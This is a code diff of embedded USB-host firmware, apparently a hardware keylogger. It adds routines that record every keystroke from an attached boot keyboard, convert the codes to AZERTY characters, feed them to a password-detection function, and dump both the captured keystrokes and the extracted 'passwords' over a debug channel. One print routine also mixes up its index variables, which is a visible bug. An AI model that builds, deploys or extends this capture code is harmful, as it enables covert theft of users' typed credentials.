@@ -59,9 +59,9 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
     uint8_t *report = (uint8_t *)hidp->config->report_buffer;
 
     if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
-        //        chSysLockFromISR();
+        //chSysLockFromISR();
         chMBPostI(&umb, (msg_t)report);
-        //        chSysUnlockFromISR();
+        //chSysUnlockFromISR();
     }
 }
 
@@ -132,6 +132,19 @@ void usbh_init(void)
     chThdCreateStatic(waUsbhMainLoop, sizeof(waUsbhMainLoop), NORMALPRIO, ThreadUsbhMainLoop, 0);
 }
 
+void usbh_add_input(uint16_t input)
+{
+    if((uint8_t)input) {
+        inputs[input_index] = input;
+        usbh_detector(hid2azerty(input));
+
+        //input loop
+        input_index++;
+        if(input_index >= NB_INPUT)
+            input_index = 0;
+    }
+}
+
 /* 
  * Store <size> lasts inputs into password buffer
  * size: number of inputs to store
@@ -191,4 +204,20 @@ void usbh_detector(char input)
         SEGGER_RTT_Write(0, passwords, password_index);
         rtt_printf("");
     }
+}
+
+void usbh_print_input(void)
+{
+    int nb_input_print = 20;
+    int start          = (input_index - nb_input_print > 0) ? input_index - nb_input_print : 0;
+    for(int i = start; i < input_index; i++)
+        rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(inputs[i]), inputs[i]);
+}
+
+void usbh_print_password(void)
+{
+    int nb_password_print = 20;
+    int start             = (input_index - nb_password_print > 0) ? input_index - nb_password_print : 0;
+    for(int i = start; i < password_index; i++)
+        rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);
 }
